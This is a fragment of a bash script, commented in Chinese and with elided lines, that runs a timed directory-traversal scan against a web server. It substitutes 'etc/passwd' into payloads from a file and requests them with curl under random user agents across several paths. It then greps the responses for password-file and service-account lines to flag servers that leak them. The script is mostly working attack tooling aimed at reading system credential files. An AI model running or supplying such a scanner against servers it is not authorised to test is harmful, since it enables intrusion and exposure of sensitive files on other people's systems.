...
LOG_FILE="dir_traversal_scan_$(date +%Y%m%d_%H%M%S).log"
PAYLOAD_FILE="deep_traversal.txt"
TARGET_FILE="etc/passwd"    # 尝试访问的目标文件
...
# 路径列表
PATHS=("/" "/images/" "/downloads/" "/static/" "/admin/" "/api/v1/")
...
start_scan() {
  ...
  while [ $current_time -lt $end_time ]; do
    ...
    # 替换{FILE}为实际目标文件
    local payload=${random_payload/\{FILE\}/$TARGET_FILE}
    ...
    # 构建测试URL
    local test_url="https://$SERVER:$PORT$random_path$payload"
    
    # 发送请求
    echo "[$(date +%T)] 测试 #$((++request_count)): ${test_url:0:80}..." | tee -a $LOG_FILE
    
    # 使用curl测试
    curl_output=$(curl -vk --http3 -A "$user_agent" \
    ...
    # 检查响应中是否包含敏感信息
    if echo "$curl_output" | grep -q -E "root:.*:0:0:|mysql:|apache:|httpd:|nginx:"; then
      echo "可能发现漏洞! URL: $test_url" | tee -a $LOG_FILE
      echo "$curl_output" | head -n 20 >> $LOG_FILE
      echo "----------------------------------------" >> $LOG_FILE
    fi
...
# 结果摘要
echo -e "\n扫描结果摘要:"
grep -i "可能发现漏洞" $LOG_FILE | sort | uniq -c | sort -nr
